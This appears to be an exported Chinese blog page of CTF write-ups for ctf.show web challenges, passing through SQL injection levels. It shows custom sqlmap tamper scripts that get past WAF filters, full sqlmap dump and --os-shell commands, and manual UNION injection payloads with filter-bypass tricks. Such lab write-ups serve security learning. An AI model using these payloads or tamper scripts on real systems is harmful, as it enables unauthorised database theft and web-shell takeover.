class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">from lib.core.compat import xrange</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload)):</span><br><span class="line">            <span class="keyword">if</span> not firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += chr(0x9)</span><br><span class="line">                    <span class="built_in">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">                quote = not quote</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            elif payload[i] == &#x27;</span><span class="string">&quot;&#x27;:</span></span><br><span class="line"><span class="string">                doublequote = not doublequote</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            elif payload[i] == &quot;</span> <span class="string">&quot; and not doublequote and not quote:</span></span><br><span class="line"><span class="string">                retVal += chr(0x9)</span></span><br><span class="line"><span class="string">                continue</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            retVal += payload[i]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return retVal</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689171350412-cce3a4a4-a1d3-4275-9381-4b8988fe4572.png" alt="image.png"><br>然后就可以运行自己的tamper了。</p><h1 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">// <span class="variable">$id</span> = str_replace(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$id</span>);</span><br><span class="line">  <span class="keyword">function</span> waf(<span class="variable">$str</span>)&#123;</span><br><span class="line">   <span class="built_in">return</span> preg_match(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>过滤了select，但是是小写，sqlmap是可以用大写的绕过的。因此还用上题目的脚本即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment2 --batch -D ctfshow_web -T ctfshow_flaxcac -C flagvca --d</span><br><span class="line">ump</span><br></pre></td></tr></table></figure><p>注意我这里使用的上道题编写的<code>space2comment**2**</code>而不是<code>space2comment</code>当然用后者也可以。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>有时候可以直接无差别爆破，比如知道库就直接跳到dump，sqlmap会自己挖出所有的串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment2 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689171787437-65fd338d-a17a-4aa1-b36f-d7a463cb3675.png" alt="image.png"></p><h1 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h1><h3 id="自定义tamper"><a href="#自定义tamper" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> waf(<span class="variable">$str</span>)&#123;</span><br><span class="line"> //TODO 未完工</span><br><span class="line"> <span class="built_in">return</span> preg_match(<span class="string">&#x27;/ |\*|\=/&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤空格 * =<br>等号可以用<code>like</code>代替<br>简便一下脚本如图：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = retVal.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot; like &quot;</span>)</span><br><span class="line">    retVal = retVal.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x09</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p>我保存在了tamper目录下的ctfshow209.py文件<br>payload运行即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://cbbe7a5a-da99-494c-b921-3167867de00b.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://cbbe7a5a-da99-494c-b921-3167867de00b.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=ctfshow209 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><h2 id="By-the-way"><a href="#By-the-way" class="headerlink" title="By the way"></a>By the way</h2><p>做了这么多，payload其实不太好换，来个正则直接在emeditor里面直接替换了。<br>正则如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[a-zA-Z0-<span class="number">9</span>\-\.]+/</span><br></pre></td></tr></table></figure><p>正则有机会一定要学一下。</p><h1 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h1><h3 id="自定义tamper-1"><a href="#自定义tamper-1" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function decode($<span class="built_in">id</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode($<span class="built_in">id</span>))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>它的作用是对一个经过两次base64编码的字符串进行解码和反转操作。<br>具体分析如下：</p></li><li><p>base64_decode($id)：此部分代码表示对一个变量 $id 进行base64解码操作。在Python中，可以使用 base64.b64decode() 函数来实现。</p></li><li><p>strrev(base64_decode($id))：此部分代码表示对上一步中解码后的结果进行字符串反转操作。在Python中，可以使用字符串切片来实现，即将字符串反向取值，例如 string[::-1]。</p></li><li><p>base64_decode(strrev(base64_decode($id)))：此部分代码表示对前一步的反转结果再次进行base64解码。</p></li><li><p>strrev(base64_decode(strrev(base64_decode($id))))：最后一步将前一步解码后的结果再次进行字符串反转操作，得到最终的解码结果。</p></li></ol><p>把解密过程反过来即可。<br>我们可以有两种解法第一种wp中写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">retVal = retVal.replace(<span class="string">&quot;-- -&quot;</span>, <span class="string">&quot;#&quot;</span>)</span><br><span class="line">retVal = b64encode(<span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(b64encode(<span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(retVal)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(retVal)</span><br></pre></td></tr></table></figure><p>第二种就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">reversed_string1 = retVal[::-<span class="number">1</span>]</span><br><span class="line">encoded_string1 = base64.b64encode(reversed_string1.encode()).decode()</span><br><span class="line">reversed_string2 = encoded_string1[::-<span class="number">1</span>]</span><br><span class="line">encrypted_string = base64.b64encode(reversed_string2.encode()).decode()</span><br><span class="line"><span class="built_in">print</span>(encrypted_string)</span><br></pre></td></tr></table></figure><p>其中第二种<code>[::-1]</code>是Python中字符串切片（slice）的一种用法，它表示将字符串反向取值。<br>脚本以第一种为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = retVal.replace(<span class="string">&quot;-- -&quot;</span>, <span class="string">&quot;#&quot;</span>)</span><br><span class="line">    retVal = b64encode(<span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(b64encode(<span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(retVal)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://63c468c1-0392-<span class="number">4832</span>-87ce-7fe0b3345449.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://63c468c1-0392-4832-87ce-7fe0b3345449.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=ctfshow210 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><h2 id="python中的-1"><a href="#python中的-1" class="headerlink" title="python中的[::-1]"></a>python中的[::-1]</h2><p>在Python中，[start:stop:step] 是用来截取或提取字符串（或列表等可迭代对象）的一种方法。当省略 start 和 stop 参数时，它会默认使用整个字符串。而 step 参数表示步长，控制取值的方向和间隔。<br>当 step 参数为负数时，即 [::-1]，它表示从字符串的末尾开始，以倒序的方式取值，步长为1。换句话说，它实现了将字符串反转的效果。<br>下面是一个例子来说明该用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">复制代码</span><br><span class="line">string = &quot;Hello, World!&quot;</span><br><span class="line">reversed_string = string[::-1]</span><br><span class="line">print(reversed_string)</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">复制代码</span><br><span class="line">!dlroW ,olleH</span><br></pre></td></tr></table></figure><h1 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h1><h3 id="自定义tamper-2"><a href="#自定义tamper-2" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><p>加了一个空格过滤，修改一下脚本即可。<br>在脚本操作中加一行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = retVal.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x0a</span>))</span><br></pre></td></tr></table></figure><p>即可。<br>payload不变：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://0e8324af-9ca2-4ec5-b9ce-0d6856a8528a.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://0e8324af-9ca2-4ec5-b9ce-0d6856a8528a.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=ctfshow210 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><h1 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h1><h3 id="自定义tamper-3"><a href="#自定义tamper-3" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//对查询字符进行解密</span><br><span class="line">  function decode($<span class="built_in">id</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode($<span class="built_in">id</span>))));</span><br><span class="line">  &#125;</span><br><span class="line">function waf($<span class="built_in">str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*/&#x27;</span>, $<span class="built_in">str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加了个星号，无关痛痒，还用上一题的即可。<br>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://29fa0dfe-7f52-4f70-<span class="number">83e9</span>-2795e92dcb6b.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://29fa0dfe-7f52-4f70-83e9-2795e92dcb6b.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=ctfshow210 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><h1 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h1><h3 id="–os-shell-一键getshell"><a href="#–os-shell-一键getshell" class="headerlink" title="–os-shell 一键getshell"></a>–os-shell 一键getshell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://97a2ce63-a000-<span class="number">4020</span>-838b-9eccc076d657.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --method=PUT --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=<span class="string">&quot;http://97a2ce63-a000-4020-838b-9eccc076d657.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span>  --tamper=ctfshow210.py --os-shell</span><br></pre></td></tr></table></figure><h2 id="什么是–os-shell"><a href="#什么是–os-shell" class="headerlink" title="什么是–os-shell"></a>什么是–os-shell</h2><p>–os-shell 其本质是写入两个shell文件，其中一个可以命令执行，另一个则是可以让我们上传文件；<br>不过也是有限制的，上传文件我们需要受到两个条件的限制，一个是网站的绝对路径，另一个则是导入导出的权限</p><p>在mysql中，由 secure_file_priv 参数来控制导入导出权限，该参数后面为null时，则表示不允许导入导出；如果是一个文件夹，则表示仅能在这个文件夹中导入导出；如果参数后面为空，也就是没有值时，则表示在任何文件夹都能导入导出<br>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://899832c9-<span class="number">8556</span>-49fb-8f82-2b4156bed9bf.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --method=PUT --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=<span class="string">&quot;http://899832c9-8556-49fb-8f82-2b4156bed9bf.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span>  --tamper=ctfshow210 --batch --level=<span class="number">5</span> --os-shell</span><br></pre></td></tr></table></figure><p>然后就会出现shell页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689175482915-61978078-d777-4dbe-820b-ad1b742325f8.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689175522091-1b21cb86-9dfb-4896-8dca-fdd1bf8d1d85.png" alt="image.png"><br>执行完输入q退出即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web171-web190SQL注入篇</title>
      <link href="/2023/07/11/web171-web190SQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>/2023/07/11/web171-web190SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>web171</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.$_GET<span class="punctuation">[</span>&#x27;id&#x27;<span class="punctuation">]</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>三栏一眼丁真，直接内容拼入即可。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>database() --+</span><br></pre></td></tr></table></figure><p>查询库名：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure><p><code>information_schema,test,mysql,performance_schema,ctfshow_web</code><br>查询表名：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p><code>ctfshow_user</code><br>查询字段</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user&#x27; --+</span><br></pre></td></tr></table></figure><p><code>id,username,password</code><br>三栏直接输出三种：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select id<span class="punctuation">,</span>username<span class="punctuation">,</span>password from ctfshow_web.ctfshow_user --+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688962855743-a9561019-8b4a-4ad8-a1b9-9829a17ae716.png" alt="image.png"><br>当然 sqlmap也是可以的。直接开注入</p><h1 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.$_GET<span class="punctuation">[</span>&#x27;id&#x27;<span class="punctuation">]</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>现实位置变为了两个。<br>通过上题的数据库结构可以直接出payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span>password from ctfshow_web.ctfshow_user2  --+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688978037707-0ffcb803-78fd-4c25-93a9-2c20d87eaa92.png" alt="image.png"></p><h1 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">$sql = <span class="string">&quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.$_GET<span class="punctuation">[</span>&#x27;id&#x27;<span class="punctuation">]</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>一样payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>password from ctfshow_web.ctfshow_user3 --+</span><br></pre></td></tr></table></figure><h1 id="web174、web175"><a href="#web174、web175" class="headerlink" title="web174、web175"></a>web174、web175</h1><p>说是考的基础，那么就一步一步来。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">$sql = <span class="string">&quot;select id,username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.$_GET<span class="punctuation">[</span>&#x27;id&#x27;<span class="punctuation">]</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    if(!preg_match(&#x27;/flag/i&#x27;<span class="punctuation">,</span> json_encode($ret)))<span class="punctuation">&#123;</span></span><br><span class="line">      $ret<span class="punctuation">[</span>&#x27;msg&#x27;<span class="punctuation">]</span>=&#x27;查询成功&#x27;;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>有返回过滤了。<br>174、175怎么输入什么都提示错误。</p><h1 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h1><h3 id="大小写绕过过滤"><a href="#大小写绕过过滤" class="headerlink" title="大小写绕过过滤"></a>大小写绕过过滤</h3><p>简单过滤，大小写就能绕过过滤。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; uNion SeLeCt <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>password from ctfshow_user --+</span><br></pre></td></tr></table></figure><h1 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h1><h3 id="、-09、-0a-d绕过空格过滤"><a href="#、-09、-0a-d绕过空格过滤" class="headerlink" title="/**/、%09、%0a-%d绕过空格过滤"></a>/**/、%09、%0a-%d绕过空格过滤</h3><blockquote><p><a href="https://blog.csdn.net/acsuccess/article/details/69360931">https://blog.csdn.net/acsuccess/article/details/69360931</a> 绕过空格过滤</p></blockquote><p>过滤了空格，把空格更换一下即可<br>以下是几种常见绕过过滤的方法。</p><ul><li>注释绕过 <code>/**/</code></li><li>括号绕过 <code>select(user())from dual where(1=1)and(2=2)</code></li></ul><p>除此之外要注意一下，上面几道题的payload中的+会被转义为空格，因此如果使用+就会出现无法查询的情况。<br>那么就要使用url转义来绕过空格。<br>比如：</p><ul><li>Tab &gt; %09</li><li>换页符 &gt; %0c</li></ul><p>这两个都是可以的。<br>于是就可以得到payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span>&#x27;<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span>id<span class="punctuation">,</span>username<span class="punctuation">,</span>password<span class="comment">/**/</span>from<span class="comment">/**/</span>ctfshow_user<span class="comment">/**/</span>--%<span class="number">09</span></span><br></pre></td></tr></table></figure><h1 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h1><h3 id="、-09、-0a-d绕过空格过滤-1"><a href="#、-09、-0a-d绕过空格过滤-1" class="headerlink" title="/**/、%09、%0a-%d绕过空格过滤"></a>/**/、%09、%0a-%d绕过空格过滤</h3><p>把<code>/**/</code>过滤掉了那就只能使用上面两个转义符绕过了。<br>那就用%09</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;%<span class="number">09</span>union%<span class="number">09</span>select%<span class="number">091</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>password%<span class="number">09</span>from%<span class="number">09</span>ctfshow_user%<span class="number">09</span>--%<span class="number">09</span></span><br></pre></td></tr></table></figure><p>注意，经过测试，<code>%09</code>可以替换为<code>%0a-%0d</code>均可以</p><h1 id="web179"><a href="#web179" class="headerlink" 